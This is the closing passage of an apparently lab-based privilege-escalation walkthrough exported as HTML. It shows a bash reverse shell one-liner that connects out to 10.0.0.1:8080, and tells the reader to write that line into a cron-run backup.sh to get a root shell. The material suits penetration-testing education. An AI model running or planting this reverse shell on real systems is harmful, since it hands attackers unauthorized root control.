</p><figure id="51dfcb17-712b-4520-81c3-58d977b65893" class="image"><a href="Exploiting%20Via%20Image%20Upload%20e91d72e6fbc04215bba987fb71611bcb/Untitled%2013.png"><img style="width:2013px" src="Exploiting%20Via%20Image%20Upload%20e91d72e6fbc04215bba987fb71611bcb/Untitled%2013.png"/></a></figure><p id="253f9341-857e-463e-83b8-a2decb1c153a" class="">
</p><p id="da33fb00-411e-4f4f-a2e9-9f15ad95a266" class="">As we can see the file is in here , Now give it executable permissions </p><p id="1cef9740-1fc7-41f2-a80f-71fd418cef34" class="">after running the script we can see there is crontab running in the back ground:</p><figure id="dc22b461-7229-4008-8b7a-c084ee367362" class="image"><a href="Exploiting%20Via%20Image%20Upload%20e91d72e6fbc04215bba987fb71611bcb/Untitled%2014.png"><img style="width:1266px" src="Exploiting%20Via%20Image%20Upload%20e91d72e6fbc04215bba987fb71611bcb/Untitled%2014.png"/></a></figure><p id="96b64f94-b774-4856-86d3-9fd184f08f2d" class="">
</p><p id="795302f1-20ad-493b-b1fe-126dfc2fb0a6" class="">This will run every our every min like we discussed previously . </p><p id="960d9a88-003f-4eeb-87fb-04ee4abf5b8f" class="">
</p><p id="f0cb9394-0696-445a-b48b-b4d060de7653" class="">
</p><p id="b9e9d9cf-07b5-489d-9f70-0511db3bca66" class="">Now  lgo to google and say “bash reverse shell one liner”</p><p id="b6138a3a-465a-4a06-bc10-5bd60ae042a7" class="">There is reverse shell cheat sheet from pentest monkey : <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p><p id="8b4727a5-a648-4705-bab6-2a1c6d09e39f" class="">
</p><p id="9eccf4da-2730-4060-92d8-25b3224a7a4e" class="">Command : <code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</code></p><p id="b4c7b4b9-b3fe-45c6-bc50-f928116077dc" class="">We need to change the ip add and port number before using the command.</p><p id="114f0a42-49a7-443b-806d-3bbf488c592b" class="">
</p><p id="6cbf4e6b-8987-4d22-bc7b-3110ca8dac07" class="">
</p><p id="8771d48c-fb65-45c6-b033-190971e59184" class="">Now lets modify the <a href="http://backup.sh">backup.sh</a> file . with the command above.</p><p id="d397a0c0-cbb5-406e-b212-38d9dca63db9" class="">After that start listening on the port you mentioned before modifying and saving the <a href="http://backup.sh">backup.sh</a> file.</p><p id="2b0c7cf0-d38e-4343-9e13-37275c5cdc30" class="">Now save the file when crontab runs in a min you will get the root access.</p><p id="89dbef67-ae54-4bdd-90a5-aa9a0006041b" class="">
</p><figure id="fb07e69a-bb85-4f74-aaef-98d904bc8857" class="image"><a href="Exploiting%20Via%20Image%20Upload%20e91d72e6fbc04215bba987fb71611bcb/Untitled%2015.png"><img style="width:1618px" src="Exploiting%20Via%20Image%20Upload%20e91d72e6fbc04215bba987fb71611bcb/Untitled%2015.png"/></a></figure><p id="0fd10c9d-3d98-43cb-acc2-28b4e58b8109" class="">
</p><p id="04b7f14d-e274-406b-bf47-b6f30ec82a82" class="">Finally we got the root access…..</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>